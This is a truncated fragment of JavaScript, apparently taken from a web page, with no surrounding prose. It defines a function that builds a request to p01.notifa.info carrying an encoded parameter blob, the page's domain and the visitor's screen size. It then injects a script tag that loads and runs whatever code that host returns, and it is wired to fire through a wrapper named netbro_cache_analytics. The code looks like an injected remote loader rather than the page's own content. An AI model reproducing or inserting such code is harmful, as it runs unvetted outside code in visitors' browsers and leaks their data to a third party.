 ();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
